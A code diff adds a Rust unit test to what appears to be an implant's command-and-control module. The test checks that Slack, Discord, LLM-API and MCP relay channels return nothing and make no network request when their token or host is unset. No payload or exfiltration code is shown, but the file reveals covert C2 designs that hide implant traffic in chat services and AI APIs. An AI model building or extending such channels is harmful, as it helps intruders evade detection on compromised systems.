@@ -135,3 +135,37 @@ pub unsafe fn discord_send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8
         )
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::testutil;
+    use nyx_implant_core::heap::String;
+
+    /// All four external-C2 channels must fail fast (None, no network I/O)
+    /// when the token and/or API host gate is unset — the dispatcher's
+    /// fallback chain depends on this instead of emitting an unauthenticated
+    /// request.
+    #[test]
+    fn unconfigured_channels_fail_fast_without_network() {
+        // Port 9 (discard, closed) — if a channel wrongly emitted a request
+        // the post would fail anyway, but the gate must return None first.
+        let c = testutil::ctx("127.0.0.1", 9);
+        assert!(unsafe { slack_send_recv(&c, b"x") }.is_none());
+        assert!(unsafe { llm_send_recv(&c, b"x") }.is_none());
+        assert!(unsafe { mcp_send_recv(&c, b"x") }.is_none());
+        assert!(unsafe { discord_send_recv(&c, b"x") }.is_none());
+
+        // Token without host still rejects.
+        let mut c = testutil::ctx("127.0.0.1", 9);
+        c.extc2_token = String::from("tok");
+        assert!(unsafe { slack_send_recv(&c, b"x") }.is_none());
+        assert!(unsafe { discord_send_recv(&c, b"x") }.is_none());
+
+        // Host without token still rejects.
+        let mut c = testutil::ctx("127.0.0.1", 9);
+        c.extc2_api_host = String::from("provider.example");
+        assert!(unsafe { llm_send_recv(&c, b"x") }.is_none());
+        assert!(unsafe { mcp_send_recv(&c, b"x") }.is_none());
+    }
+}
